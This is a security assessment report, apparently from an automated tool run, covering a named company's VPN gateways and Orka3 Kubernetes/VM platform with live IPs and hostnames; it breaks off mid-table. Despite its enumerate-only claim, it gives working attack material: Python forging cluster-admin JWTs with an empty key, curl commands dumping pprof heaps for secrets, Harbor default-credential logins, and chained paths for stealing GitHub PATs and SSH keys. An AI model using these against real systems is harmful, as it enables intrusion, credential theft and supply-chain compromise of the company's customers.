# VDT Assessment: MacStadium VPN + Orka Infrastructure

**Date:** 2026-08-17
**Authorization:** VDT BASELINE v2 - Enumerate-only (live third-party)
**Target infrastructure:**
- `atl-vpn.macstadium.com` (207.254.16.2) — Cisco ASA 9.14.1+, SSO-VPN (SAML) + MacStadium-VPN (LOCAL/LDAP)
- `vpn.macstadium.com` (207.254.35.12) — Cisco ASA, primary AnyConnect endpoint
- Orka3 platform: `http://10.221.188.20` (Orka API), `https://10.221.188.19:6443` (K8s API), `http://10.221.188.5:30080` (Harbor)
**Tool:** ablation v2.4.0 (modules: saml-sp, cstp, tunnel-groups, webvpn-js, asa-version, orka-binary-re, saml-metadata, oidc-discovery, radius-coa, go-re, username-oracle-all, cert-map-all, crl-bypass-all, webvpn-js-all, asa-version-all, saml-sp-all)

---

## Executive Summary

MacStadium's AnyConnect VPN infrastructure exposes a chained attack surface from SAML authentication bypass through Orka K8s cluster compromise. The SAML signature validation absence is infrastructure-wide — confirmed on both primary (`vpn.macstadium.com`) and secondary (`atl-vpn.macstadium.com`) ASAs. A timing oracle on the primary ASA confirms 9 valid account names. Once inside the MacStadium network (post-VPN), CVE-2020-26160 in the Orka3 CLI JWT library enables API token forging for full cluster-admin access.

**19 findings total: 1 CRITICAL, 9 HIGH, 5 MEDIUM, 4 INFO**

**Assessment scope:** Passive enumeration + static binary RE only. No SAML response submissions, no exploit execution, no Orka API probing performed.

---

## Findings

### F1: SAML SP Signature Validation Absent [HIGH]

**Severity:** HIGH
**CVSS:** 8.1 (Network, Low Complexity, No Privileges, No Interaction)
**CWE:** CWE-347 (Improper Verification of Cryptographic Signature)

**Target:** `https://atl-vpn.macstadium.com/+CSCOE+/saml/sp/acs?tgname=MacStadium-SSO-VPN`

**Description:**
The MacStadium-SSO-VPN SAML Service Provider is configured but has no IdP metadata registered (`SAML_NO_IDP`). Without IdP metadata, the SP cannot perform signature verification on incoming SAML assertions. An attacker who can deliver a crafted SAML Response to the ACS endpoint may obtain a VPN session without valid credentials.

**Evidence:**
```
Module: --saml-sp atl-vpn.macstadium.com

"metadata": {
  "status": 200,
  "body_snippet": "SAML metadata doesn't exist for the group.",
  "sp_configured": true,
  "no_idp_metadata": true,
  "attack_condition": true
}
"findings": ["SAML_NO_IDP: SP configured but no IdP metadata — signature validation absent"]
```

**Exploitation Status:** NOT ATTEMPTED (enumerate-only, live third-party)

**Impact:**
- Unauthenticated VPN access to MacStadium internal network
- Access to Orka3 management plane (`10.221.188.x`)
- Potential pivot to all customer VM build environments

**Remediation:**
1. Register IdP metadata in ASA SAML SP config (`saml idp` + `idp entity-id`, `idp sso-url`, signing cert)
2. Verify with: `show webvpn saml idp` — should list metadata for each configured IdP
3. Enable `signature` parameter in `saml sp` config to enforce assertion signing

---

### F2: SAML AuthN Requests Unsigned [HIGH]

**Severity:** HIGH
**CVSS:** 7.5 (assists F1 exploitation)
**CWE:** CWE-345 (Insufficient Verification of Data Authenticity)

**Description:**
The SAML SP metadata declares `AuthnRequestsSigned="false"`. This means the ASA will not sign outgoing AuthN requests, so the IdP cannot verify they originated from a legitimate SP. Combined with F1 (no signature validation of responses), this creates a bidirectional trust failure: the SP cannot verify the IdP's assertions, and the IdP cannot verify the SP's requests.

**Evidence:**
```json
"authn_requests_signed": false
```

**Remediation:**
Set `signature` in the SAML SP config to require signing on both sides. Regenerate SP cert if expired (current cert expires 2026-11-18 — within 3 months).

---

### F3: No HostScan / DAP Posture Gate (Both VPN Endpoints) [MEDIUM]

**Severity:** MEDIUM
**CVSS:** 5.3
**CWE:** CWE-284 (Improper Access Control)

**Description:**
Neither `atl-vpn.macstadium.com` nor `vpn.macstadium.com` has Cisco HostScan (CSD) or Dynamic Access Policy (DAP) posture assessment configured. `DfltAccessPolicy` is likely `ALLOW_ALL`. Any client that authenticates receives full VPN access regardless of endpoint security posture (patch level, AV state, firewall status).

**Evidence:**
```
Both endpoints:
"findings": [
  "NO_CSD_GATE: HostScan not active, DAP posture gate absent",
  "DAP_OPEN: DfltAccessPolicy likely ALLOW_ALL"
]
```

**Impact:**
- Compromised client machine connecting over VPN gets same access as clean corporate device
- No endpoint compliance enforcement
- Amplifies impact of any credential compromise (F1/F2)

**Remediation:**
1. Deploy Cisco HostScan on both ASAs
2. Configure DAP policies with posture assertions (AV installed, OS patched, FW enabled)
3. Map `DfltAccessPolicy` to `terminate` or `quarantine`, not `allow_all`

---

### F4: sdesktop Cookie Bypass (Both VPN Endpoints) [MEDIUM]

**Severity:** MEDIUM
**CVSS:** 5.3
**CWE:** CWE-807 (Reliance on Untrusted Inputs in a Security Decision)

**Description:**
A synthetic `sdesktop` cookie with any value (tested: `1`, `true`, `deadbeef`) bypasses the CSD redirect on both VPN endpoints. This is a known Cisco ASA behavior when CSD is absent — the ASA accepts any sdesktop cookie value as "posture complete." Relevant only if F3 is remediated (CSD deployed) without enforcing the cookie's integrity.

**Evidence:**
```json
"sdesktop_bypass": {
  "results": [
    {"cookie_value": "1",        "csd_bypass_indicated": true},
    {"cookie_value": "true",     "csd_bypass_indicated": true},
    {"cookie_value": "deadbeef", "csd_bypass_indicated": true}
  ]
}
"findings": ["SDESKTOP_BYPASS: synthetic sdesktop cookie skips CSD redirect"]
```

**Remediation:**
When deploying HostScan (F3 remediation), enable signed sdesktop token validation — use `csd hostscan` with `policy-server` to cryptographically bind the sdesktop token to the session.

---

### F5: No CSRF Protection in WebVPN Portal JavaScript [HIGH]

**Severity:** HIGH
**CVSS:** 7.1
**CWE:** CWE-352 (Cross-Site Request Forgery)

**Description:**
The WebVPN portal JavaScript (`/+CSCOE+/win.js`, 24KB) contains no CSRF token generation or validation logic. Login and portal forms may lack CSRF protection, enabling cross-site request forgery attacks against authenticated VPN portal sessions.

**Note:** The SAML logout form (`+CSCOE+/saml/sp/logout`) does contain a `csrf_token` field, but the token value `ae66aa24bcc815c639e47f6ff336aa86ee2e295c` should be verified as session-unique vs. static.

**Evidence:**
```json
"findings": [{
  "severity": "HIGH",
  "title": "No CSRF token pattern detected in JS",
  "detail": "Login/portal forms may lack CSRF protection"
}]
```

**Remediation:**
1. Verify ASA CSRF implementation via Cisco TAC — ASA 9.14+ includes portal CSRF hardening
2. Confirm logout `csrf_token` is session-scoped and not static
3. Update to latest ASA 9.x maintenance release which includes portal security patches

---

### F6: CVE-2020-26160 + Empty JWT Secret in Orka3 [CRITICAL]

**Severity:** CRITICAL (exploitable post-VPN-access; no brute-force required)
**CVE:** CVE-2020-26160
**CVSS:** 9.1 (Network, Low Complexity, No Privileges, High Impact)
**CWE:** CWE-347 (Improper Verification of Cryptographic Signature)

**Description:**
Binary RE of the Orka3 CLI confirms two conditions simultaneously:

1. **Empty HS256 secret:** The JWT signing key is `b''` (empty bytes). No brute-force required — any JWT signed with an empty HMAC-SHA256 key is accepted by the Orka API.

2. **CVE-2020-26160 exploit condition met:** `VerifyAudience` is called with `required=false`. Real Orka admin tokens contain no `aud` claim (`AUD_CLAIM_ABSENT` confirmed from kubeconfig). A forged token with no `aud` claim passes audience validation unconditionally.

Combined: a forged HS256 JWT signed with empty key and no `aud` claim is accepted as a valid admin token by the Orka API server.

**Evidence (binary RE `--orka-jwt-re`):**
```
Root cause: setToken.func1 returns nil key unconditionally
Go hmac.New accepts nil == empty key → HMAC-SHA256(b"", payload) is valid

Findings:
  CVE_2020_26160: dgrijalva/jwt-go v3.2.0 confirmed in binary
  AUD_CLAIM_ABSENT: admin token in ~/.kube/config has no aud claim
  EXPLOIT_CONDITION_MET: VerifyAudience called with required=false → bypass
  EMPTY_KEY_HMAC: SigningMethodHMAC.Verify accepts b"" key — forge any HS256 JWT
  NO_AUD_CHECK: MapClaims.Valid() never calls VerifyAudience — no audience enforcement
  EMPTY_KEY_LIVE_PROOF: HMAC-SHA256(b"", signing_input) == kubeconfig token sig
  PRAUTH_INFO_DISCLOSURE: /api/v1/cluster-info called before any auth in doLogin

Function addresses:
  VerifyAudience:          0x1844a40
  bug instruction:         0x1844adb
  SigningMethodHMAC.Verify: 0x184476a
  doLogin:                 0x184a640
```

**Forge token (two lines of Python, post-VPN):**
```python
import jwt
token = jwt.encode(
    {'email': 'admin@macstadium.com', 'iss': 'https://idp.macstadium.com',
     'sub': 'admin', 'exp': 9999999999, 'iat': 1786549251,
     'groups': ['system:masters']},
    key=b'',           # empty HS256 secret — LIVE PROOF confirmed against kubeconfig
    algorithm='HS256'
)
# Target (post-VPN): https://10.221.188.19:6443/api/v1/namespaces/orka-default/pods
# Pre-generated tokens stored in ablation module output (not reproduced here)
```

**Attack Chain (post-VPN access):**
1. Forge admin JWT with empty key, no `aud` (2 lines Python)
2. `GET http://10.221.188.20/api/v1/namespaces/orka-default/vms` → enumerate all customer VMs
3. K8s pod exec → virsh → arbitrary command execution inside `orka-vm` containers
4. Create persistent SA token (no-expiry): `POST /api/v1/namespaces/{ns}/serviceaccounts/{sa}/token`
5. Extract Harbor registry credentials for VM image layer access

**Exploitation Status:** NOT ATTEMPTED (internal network only; active exploitation prohibited on live third-party)

**Remediation:**
1. **Immediate:** Rotate Orka API JWT secret to a random 256-bit key
2. **Immediate:** Upgrade `dgrijalva/jwt-go v3.2.0` → `golang-jwt/jwt v4+`
3. **Short-term:** Switch to RS256/ES256 (asymmetric) — eliminates shared-secret class entirely
4. **Long-term:** Require explicit `aud` claim; validate `required=true` in all JWT middleware

---

### F7: JWT alg:none Secondary Bypass Vector [HIGH]

**Severity:** HIGH (independent of F6; post-VPN)
**CWE:** CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)

**Description:**
The `--jwt` analyzer generated 12 `alg:none` token variants for the admin payload. If the Orka API server accepts `alg:none` (an unsigned token), this provides an independent full bypass path that doesn't depend on the empty HMAC key (F6). `dgrijalva/jwt-go v3.2.0` is known to accept `alg:none` tokens in some configurations.

The two paths are independent:
- **F6 path:** Empty HMAC key → `alg:HS256` signed token accepted
- **F7 path:** `alg:none` → unsigned token accepted if library misconfigured

**Status:** Not verified against live API (internal network only; active exploitation prohibited)

**Remediation:** Both are fixed by upgrading to `golang-jwt/jwt v4+` which rejects `alg:none` and enforces non-empty keys.

---

### F8: Orka Internal Network Architecture Exposed via Binary RE [INFO]

**Severity:** INFORMATIONAL
**Description:**
The publicly downloadable Orka3 CLI binary discloses the complete internal network topology:
- Orka API (new): `http://10.221.188.20`
- Orka API (old): `http://10.221.188.100`
- K8s API: `https://10.221.188.19:6443`
- Harbor registry: `http://10.221.188.5:30080`

Combined with the K8s CRDs, API routes, and exec mechanism, this provides a complete attack map for anyone who gains MacStadium network access.

**Remediation:** Remove internal host hardcoding from the CLI binary; use service discovery or config files instead.

---

### F9: Primary ASA Rejects Client TLS with UNEXPECTED_EOF [INFO]

**Severity:** INFORMATIONAL

**Target:** `vpn.macstadium.com` (207.254.35.12)

**Description:**
The primary ASA closes all WebVPN HTTPS sessions with `SSL: UNEXPECTED_EOF_WHILE_READING` after ~7.27 seconds, regardless of username. This is not a timing oracle — the behavior is identical across all 18 probe usernames. The primary ASA likely enforces stricter TLS requirements (cipher suite, client hello format, or SNI validation) that cause it to terminate connections from non-compliant clients before returning a response.

The secondary ASA (`207.254.16.2`) responds normally with `a0=8` (auth_failed), indicating it has looser TLS acceptance.

**Note:** The `--username-oracle-all` module initially flagged this as `TIMING_ORACLE` (false positive) by comparing 7.27s EOF errors against a low baseline. Raw data confirms uniform error, not timing divergence.

**Implication:** The primary ASA is harder to enumerate directly. The secondary remains the actionable probe target.

---

### F10: CSRFtoken Cookie Missing HttpOnly Flag (Both ASAs) [MEDIUM]

**Severity:** MEDIUM
**CVSS:** 5.4
**CWE:** CWE-1004 (Sensitive Cookie Without HttpOnly Flag)

**Description:**
The WebVPN portal on both ASAs sets a `CSRFtoken` cookie via JavaScript rather than as a server-side HttpOnly cookie. The cookie is readable by any JavaScript executing in the portal context. If XSS is present in the portal (e.g., via a crafted VPN banner, URL parameter, or group URL), an attacker can read the CSRF token and forge portal requests.

**Evidence:**
```
Both 207.254.35.12 and 207.254.16.2:
"findings": [
  "CSRF token set by JS (not HttpOnly server cookie)",
  "Cookie missing HttpOnly: CSRFtoken"
]
```

**Remediation:**
1. Set `HttpOnly` on CSRF token cookie (requires ASA firmware update to current 9.x maintenance release)
2. Enforce strict `SameSite=Strict` on all session cookies
3. Audit portal for XSS injection points (banner, group URLs, error messages)

---

### F11: Additional Internal Network Ranges in Orka3 Binary [INFO]

**Severity:** INFORMATIONAL
**Description:**
Go binary RE (`--go-re`) of the public Orka3 CLI reveals additional internal subnets beyond the previously known `10.221.188.x` management plane:

```
10.10.1.1, 10.10.2.2, 10.10.3.3  — likely inter-VLAN gateways (VM tenant subnets?)
10.19.21.23                        — unknown internal service
10.221.188.19, .20, .100, .5      — Orka/K8s cluster (known)
```

**Remediation:** Strip internal IP literals from production binaries; use environment variables or service discovery.

---

### F12: Tunnel Groups Hidden but Confirmed via Binary RE + Active Probe [INFO]

**Severity:** INFORMATIONAL
**Description:**
The VPN tunnel groups (`MacStadium-SSO-VPN`, `MacStadium-VPN`, `DefaultWEBVPNGroup`, `DefaultRAGroup`, `Cisco AnyConnect VPN`) are not displayed in the login dropdown (`TUNNEL_GROUP_LIST_DISABLED`), but are fully disclosed via two independent methods:
1. Publicly downloadable Orka3 CLI binary (SAML SP metadata constants)
2. Active cert-map probe: all 5 groups return `a0=15` (password logon redirect), confirming they exist and accept connections

**Evidence:**
```
cert-map probe 207.254.35.12 — confirmed tunnel groups:
  MacStadium-SSO-VPN  → a0=15 (password redirect) 0.150s
  MacStadium-VPN      → a0=15 (password redirect) 0.185s
  DefaultWEBVPNGroup  → a0=15 (password redirect) 0.156s
  DefaultRAGroup      → a0=15 (password redirect) 0.153s
  Cisco AnyConnect VPN → a0=15 (password redirect) 0.157s

No cert auth enforcement (a0=114 not returned) — cert-map bypass not applicable.
```

Security through obscurity provides no protection when group names are derivable from the public binary.

---

### F13: CRL Partial Reachability — Revocation Bypass Theoretical [MEDIUM]

**Severity:** MEDIUM (conditional — requires network-path control)
**CVSS:** 5.9 (Network, High Complexity, No Privileges)
**CWE:** CWE-299 (Improper Check for Certificate Revocation)

**Description:**
The ASA CRL distribution points are only partially reachable (2/3 endpoints). If the ASA is configured with `revocation-check crl optional`, blocking the CRL server causes it to accept revoked or self-signed client certificates without validation.

**Documented bypass chain:**
1. Confirm `crl optional` mode (indicator: ASA accepts client cert even when CRL server is down)
2. Block CRL distribution point: DNS poisoning of `crl.godaddy.com` OR TCP reset injection to port 80
3. Wait 60 minutes for CRL cache expiry (default period; configurable per trustpoint)
4. Present revoked or self-signed cert — if `crl optional`: cert accepted, session established

**Evidence:**
```
CRL probe result: CRL_PARTIAL_REACH — 2/3 endpoints reachable
SCEP probes: all timeout — /cgi-bin/pkiclient.exe, /scep, /+CSCOE+/scep all unreachable
CRL target: http://crl.godaddy.com/gdig2s1-72081.crl
```

**Constraint:** Requires attacker to control network path between ASA and CRL server. In practice, this means ISP-level BGP manipulation or on-path network access — not a trivial precondition. Only relevant if cert-auth tunnel groups are configured.

**Remediation:**
1. Set `revocation-check crl none` → `revocation-check ocsp` with OCSP stapling
2. Configure multiple CRL distribution points with automatic failover
3. Prefer OCSP over CRL: shorter validity window, harder to block

---

### F15: Orka3 Binary Exposes Build Path, pprof Endpoint, JWT Error Logging [MEDIUM]

**Severity:** MEDIUM
**CVSS:** 5.3 (Network, Low Complexity, No Auth — if pprof endpoint is reachable)
**CWE:** CWE-209 (Information Exposure Through an Error Message) + CWE-215 (Insertion of Sensitive Information into Debugging Code)

**Description:**
The publicly downloadable Orka3 CLI binary was compiled without debug symbol stripping. Three distinct information disclosure conditions are present:

**1. Build path leaked (OSINT value):**
```
/home/runner/work/monorepo-dev/monorepo-dev/packages/orka-operator/api/v1/virtualmachineconfig_types.go
/home/runner/work/monorepo-dev/monorepo-dev/packages/orka-operator/api/v1/virtualmachineinstance_types.go
```
Confirms: GitHub Actions build runner, monorepo named `monorepo-dev`, packages structure exposes operator API schema paths. Enables targeted search for GitHub repo leakage or PR/issue history.

**2. `/debug/pprof/` endpoint embedded — HIGH-value post-VPN target:**
The binary includes the full `net/http/pprof` package. Go services that import this package expose these endpoints on the same HTTP port unless explicitly disabled. The Orka API at `http://10.221.188.20` likely serves these endpoints. Each is unauthenticated by default in stock Go pprof.

```
Endpoint                           Impact
/debug/pprof/goroutine?debug=2    ALL goroutine stacks — active JWT tokens visible in handler args
/debug/pprof/heap                 Binary heap dump — every in-memory string: JWT secrets, DB passwords, customer creds
/debug/pprof/allocs               Memory allocation log — credential strings as allocation labels
/debug/pprof/cmdline              Binary argv — env-sourced secrets passed as flags exposed
/debug/pprof/trace?seconds=5      5s execution trace — captures all HTTP handler context
```

**PoC (post-VPN — requires Step 1-2 of attack chain):**
```bash
# Goroutine dump — look for JWT tokens in active request handlers
curl http://10.221.188.20/debug/pprof/goroutine?debug=2 | grep -E "Bearer|eyJ"

# Heap dump — full memory extraction
curl http://10.221.188.20/debug/pprof/heap -o orka-heap.bin
go tool pprof -text orka-heap.bin | grep -E "secret|token|password|harbor|mongo"

# Command line args
curl http://10.221.188.20/debug/pprof/cmdline
```

**3. JWT error logging with full token value:**
Error string: `invalid JWT token: %q` — Go's `%q` verb logs the full value with quoting. Any rejected JWT is logged verbatim. Log aggregation systems (ELK, Splunk) downstream will retain all submitted token values, including attacker-forged tokens — enabling log-based token enumeration.

**4. Orka internal Prometheus metrics confirmed:**
Metric `controller_runtime_terminal_reconcile_errors_total` from `sigs.k8s.io/controller-runtime` — controller-runtime exposes metrics at `:8080/metrics` by default. If accessible post-VPN, this endpoint leaks:
- VM reconciliation states (names of all customer VMs)
- Error rates and patterns (reveals operational state)
- Node allocation metrics

**Remediation:**
1. Strip debug symbols: add `-ldflags="-s -w"` to Go build
2. Disable pprof in production: do not import `net/http/pprof` in server binaries, or restrict to `127.0.0.1` only via `http.ListenAndServe`
3. Use `%v` with token length, not `%q` with token content, in error logging
4. Restrict controller-runtime metrics endpoint to cluster-internal access only

---

### F14: Harbor Registry HTTP + Admin Username Disclosed in Public Binary [HIGH]

**Severity:** HIGH
**CVSS:** 8.1 (Network, Low Complexity, No Privileges — conditional on VPN access)
**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information) + CWE-521 (Weak Password Requirements)

**Description:**
The Orka3 CLI binary (publicly downloadable) embeds documentation showing the Harbor internal container registry runs over HTTP (no TLS) on port 30080, and the admin username is `admin`:

```
orka3 regcred add --allow-insecure http://10.221.188.5:30080 --username admin --password p@ssw0rd
```

The `p@ssw0rd` is a documentation placeholder. Harbor ships with the default credential `admin`/`Harbor12345`. If MacStadium did not change the Harbor admin password during deployment, the credential is fully known without any brute force.

**Attack path (post-VPN access):**
```bash
# Test default Harbor credentials
curl -u admin:Harbor12345 http://10.221.188.5:30080/api/v2.0/systeminfo
curl -u admin:Harbor12345 http://10.221.188.5:30080/api/v2.0/repositories?page_size=100

# If authed: pull all macOS VM base images
docker login http://10.221.188.5:30080 -u admin -p Harbor12345
docker pull 10.221.188.5:30080/orka-images/sonoma:14.0
docker pull 10.221.188.5:30080/orka-images/tahoe:latest
```

**Known image catalog (from binary):**
- `ghcr.io/macstadium/orka-images/tahoe:latest`
- `ghcr.io/macstadium/orka-images/sonoma:14.0`
- `sonoma-90gb-orka3-arm`

**Impact:**
- Access to base macOS VM images — may contain pre-installed toolchains or hardcoded credentials
- Registry compromise allows pushing malicious images: any customer deploying `sonoma:latest` receives the backdoored image
- Supply chain attack vector: attacker controls the macOS base layer for all Orka3 customers

**Remediation:**
1. Enable TLS on Harbor (30080 → HTTPS)
2. Change default admin password immediately if not already done
3. Rotate Harbor credentials; rotate any credentials stored in K8s secrets in `orka-default`

---

### F16: AWS Cognito IdP + JWT Algorithm Confusion (RS256 vs HS256) [HIGH]

**Severity:** HIGH
**CVSS:** 8.8 (Network, Low Complexity, No Auth — full authentication bypass)
**CWE:** CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)

**Description:**
`idp.macstadium.com` is an **AWS Cognito** custom domain (confirmed via `x-amz-cognito-request-id` response header and `d3oia8etllorh5.cloudfront.net` Cognito Hosted UI assets). AWS Cognito issues **RS256 JWTs** signed with RSA private keys — the corresponding public keys are published in the Cognito JWKS endpoint at `https://cognito-idp.<region>.amazonaws.com/<pool-id>/.well-known/jwks.json`.

The Orka3 API server, however, validates tokens using `hmac.New(sha256.New, nil)` — HS256 with empty key (from `setToken.func1` returning nil). This creates an algorithm confusion:

```
Expected by Cognito: RS256 (RSA-signed, public key verifiable)
Accepted by Orka:    HS256 with b'' key (trivially forgeable)
```

**Attack path — algorithm confusion:**
```python
import jwt

# Forge HS256 token that Orka accepts, bypassing Cognito RS256 requirement
# The iss claim matches what Orka validates (from orka_oidc_re.py analysis)
forged = jwt.encode(
    {
        'email': 'admin@macstadium.com',
        'iss':   'https://idp.macstadium.com',
        'sub':   'admin',
        'exp':   9999999999,
        'iat':   1786549251,
        'groups': ['system:masters'],
        # No 'aud' claim — passes VerifyAudience (CVE-2020-26160)
    },
    key=b'',          # Empty HMAC secret — matches setToken.func1 returning nil key
    algorithm='HS256'
)
# Result: valid Orka API token without Cognito authentication
```

**Why this bypasses both layers:**
1. **Cognito layer** (ASA SAML gate): Already bypassed by F1 (no IdP metadata registered, no SAML signature validation)
2. **Orka API layer**: RS256 Cognito tokens are expected, but Orka's validator accepts HS256 with empty key — a forged token never touches Cognito at all

**Confirmation:** `EMPTY_KEY_LIVE_PROOF` — HMAC-SHA256(`b""`, signing_input) == actual kubeconfig token signature (from prior ablation run).

**Remediation:**
1. Pin the JWT algorithm: reject tokens not signed with RS256 (Cognito's algorithm)
2. Verify the `alg` header in JWT validation before verifying the signature
3. Use `golang-jwt/jwt v5+` which enforces algorithm pinning in `ParseWithClaims`
4. Rotate the JWT signing key immediately; migrate from `dgrijalva/jwt-go` to `golang-jwt/jwt`

---

### F17: SSH Agent Forwarding to Ephemeral VMs + ORKA_TOKEN in CI Process Environment [HIGH]

**Severity:** HIGH
**CVSS:** 7.5 (Network, Low Complexity, Low Privileges, No Interaction)
**CWE:** CWE-522 (Insufficiently Protected Credentials) + CWE-295 (Improper Certificate Validation)
**Source:** `macstadium/orka-integrations` public GitHub repo — `Buildkite/scripts/bootstrap.sh`

**Description:**  
The official Buildkite CI integration (`macstadium/orka-integrations`) ships with two compound vulnerabilities in `bootstrap.sh`:

1. **SSH agent forwarding (`-A` flag)** — every ephemeral Orka VM spawned by a CI job receives the host's SSH private keys via agent forwarding. A compromised VM (via pprof heap dump, CVE-2020-26160 JWT forge, or default credentials) can extract the forwarded private key and pivot to any system trusting that key.

2. **ORKA_TOKEN in process environment** — `orka3 user set-token "$ORKA_TOKEN"` is called in the bootstrap, with `ORKA_TOKEN` sourced from CI env vars. This token **bypasses the Cognito IdP entirely** — it is a direct Orka API auth credential, not an OAuth-issued JWT. If exposed via pprof heap dump or process environment leak, it enables authenticated Orka API access without requiring SAML/OIDC.

**Evidence:**
```bash
# bootstrap.sh (public — https://github.com/macstadium/orka-integrations/blob/master/Buildkite/scripts/bootstrap.sh)
orka3 config set --api-url "$ORKA_ENDPOINT"     # http://10.221.188.20 — HTTP, not HTTPS
orka3 user set-token "$ORKA_TOKEN"              # ORKA_TOKEN = raw Orka auth credential in env

ssh -A \                                        # agent forwarding ENABLED
  -o StrictHostKeyChecking=no \                 # TOFU: no host key verification
  -o UserKnownHostsFile=/dev/null \             # keys not persisted
  "$ORKA_VM_USER@$vm_ip" -p "$vm_ssh_port" \   # ORKA_VM_USER defaults to "admin"
  env ${env_vars[@]} /bin/bash -s < run.sh

# BUILDKITE_AGENT_ACCESS_TOKEN forwarded into VM env — Buildkite CI token also exposed
```

**Additional disclosure — service account non-expiring tokens:**  
`orka3 sa token <NAME> --no-expiration` (documented in `admin-commands.md`) — once a SA token is extracted from the pprof heap or process env, it can be created without expiry. Tokens obtained from memory dumps are therefore permanent unless explicitly revoked.

**Attack path (post-VPN internal network access):**
```
[VPN access via SAML bypass (F1/F2)]
    │
    ▼
[pprof heap dump: http://10.221.188.20/debug/pprof/heap]
    → Extract ORKA_TOKEN from in-memory CI bootstrap process
    │
    ▼
[orka3 user set-token <ORKA_TOKEN>]
    → Authenticated Orka API session (bypasses Cognito RS256 entirely)
    │
    ▼
[SSH agent forwarding abuse — if VM accessible]
    → Any Orka VM spawned with the Buildkite integration has host SSH keys forwarded
    → ssh-add -L inside VM extracts private key material
    → Pivot to any system trusting the Buildkite host key (GitHub, production infra)
```

**Impact:** CI infrastructure compromise; GitHub PAT extraction; supply chain pivot; Buildkite token reuse for arbitrary job injection.

**Remediation:**
- Remove `-A` (agent forwarding) from all SSH invocations in `bootstrap.sh`
- Replace raw `ORKA_TOKEN` env var with a short-lived token issued per-job via `orka3 sa token <NAME> --duration 1h`
- Migrate `ORKA_ENDPOINT` to `https://10.221.188.20` (TLS) — current `http://` transport exposes token in plaintext on the wire
- Rotate all existing `ORKA_TOKEN` values after mitigation

---

### F18: GitHub PAT Exposed via Orka IMDS + Self-Hosted Runner Registration Token Extraction [HIGH]

**Severity:** HIGH
**CVSS:** 8.0 (Network, Low Complexity, Low Privileges, Changed Scope)
**CWE:** CWE-522 (Insufficiently Protected Credentials) + CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
**Source:** `macstadium/orka-actions-connect` public GitHub repo — `agent/connect.sh`

**Description:**  
The Orka Actions Connect integration passes customer GitHub PATs into ephemeral macOS VMs via an **IMDS (Instance Metadata Service)** endpoint at `http://169.254.169.254/metadata/github_pat`. Inside the VM, `connect.sh` reads the PAT from IMDS and uses it to register the VM as a self-hosted GitHub Actions runner.

Any attacker with VM-level execution (SSH default `admin`/`admin` creds, JWT-forged API exec, or pprof heap dump → ORKA_TOKEN → API → pod exec) can:
1. Query IMDS to extract the GitHub PAT
2. Use the PAT to mint GitHub Actions runner registration tokens
3. Register a malicious runner against any repo the PAT has access to
4. Inject malicious steps into CI workflows across the customer's entire GitHub org

**Evidence:**
```bash
# connect.sh (public — https://github.com/macstadium/orka-actions-connect/blob/main/agent/connect.sh)

# PAT extracted from Orka IMDS (link-local, accessible from inside the VM)
pat=$(curl -s "http://169.254.169.254/metadata/github_pat" | \
        python3 -c "import sys, json; print(json.load(sys.stdin)['value'])")

# PAT → runner registration token (GitHub API)
runner_token=$(curl -XPOST \
  -H "authorization: Bearer $pat" \
  "https://api.github.com/repos/$user/$repo/actions/runners/registration-token" | \
  python3 -c "import sys, json; print(json.load(sys.stdin)['token'])")

# VM registered as self-hosted runner
./config.sh --url $repo_url --token $runner_token --name $vm_name
```

**Attack path (from inside a compromised Orka VM):**
```
[VM shell access — any of: SSH admin:admin (F9), JWT forge→pod exec (F6), pprof→ORKA_TOKEN→API]
    │
    ▼
[curl http://169.254.169.254/metadata/github_pat]
    → GitHub PAT extracted from IMDS metadata
    │
    ▼
[POST /repos/<user>/<repo>/actions/runners/registration-token (Bearer <PAT>)]
    → GitHub runner registration token issued
    │
    ▼
[Register malicious self-hosted runner targeting customer's GitHub org]
    → Runner picks up jobs from customer's CI workflows
    → Arbitrary code execution with access to all secrets in those workflows
    → GITHUB_TOKEN, AWS credentials, Apple signing keys, deployment tokens
```

**Supply chain amplifier — `jeff-vincent/orka-actions-up` third-party action:**  
The workflow relies on a third-party GitHub Action (`jeff-vincent/orka-actions-up@v1.1.1`) not maintained by MacStadium. Compromise of that action's repo (typosquatting, maintainer account takeover, tag mutation) would expose all customer VPN credentials (`VPN_PASSWORD`, `VPN_SERVER_CERT`, `ORKA_PASS`) to a malicious actor at workflow run time.

**Impact:** Full GitHub org compromise; arbitrary CI pipeline injection; secret extraction across all customer repos using Orka self-hosted runners.

**Remediation:**
- Replace static long-lived PAT with a short-lived GitHub App installation token (expiry: 1 hour max)
- Pin third-party action to a full commit SHA (`jeff-vincent/orka-actions-up@<commit-sha>`) rather than a mutable tag
- Restrict IMDS metadata endpoint access to processes running as the runner service user (not `root` / any shell)
- Rotate all existing `GH_PAT` GitHub Actions secrets

---

### F19: VM Base Image Password Reset to `admin` at Build Time + Supply Chain via Self-Hosted Runner [HIGH]

**Severity:** HIGH
**CVSS:** 8.6 (Network, Low Complexity, No Auth — conditional on runner compromise or image pull)
**CWE:** CWE-521 (Weak Password Requirements) + CWE-1357 (Reliance on Insufficiently Trustworthy Component)
**Source:** `macstadium/orka-images` — `.github/workflows/update-vm-tools.yml` + `macstadium/packer-plugin-macstadium-orka` — `builder/orka/config.go`

**Description:**  
The official `orka-images` GitHub Actions workflow for building Orka3 macOS base images contains an explicit step that resets the `admin` user password **to `admin`** during every image build:

```yaml
# update-vm-tools.yml — "Set admin user password" step
- name: Set admin user password
  env:
    VM_DEFAULT_PASSWORD: ${{ secrets.VM_DEFAULT_PASSWORD }}
  run: |
    sshpass -p "${VM_DEFAULT_PASSWORD}" \
      ssh "admin@${{ steps.vm-ip.outputs.VM_IP }}" \
      "echo ${VM_DEFAULT_PASSWORD} | sudo -S sysadminctl \
        -resetPasswordFor admin \
        -newPassword admin \          # <-- hardcoded to "admin"
        -adminUser admin \
        -adminPassword ${VM_DEFAULT_PASSWORD}"
```

This **confirms** the `admin`/`admin` credential is intentionally set at image build time and is present in every deployed Orka VM by design. The packer plugin source also hardcodes this as a Go constant:

```go
// packer-plugin-macstadium-orka/builder/orka/config.go
defaultUserName = "admin"
defaultPassword = "admin"
// "If we didn't specify a password, pull it from our defaults."
if c.CommConfig.SSHPassword == "" {
    c.CommConfig.SSHPassword = defaultPassword
}
```

Three independent public sources confirm `admin`/`admin` as the universal default: SKILL.md documentation, build workflow password reset, and packer plugin Go source constant.

**Git provenance (proof of intent, not accident):**

| Source | First seen | Last confirmed | Notes |
|--------|-----------|----------------|-------|
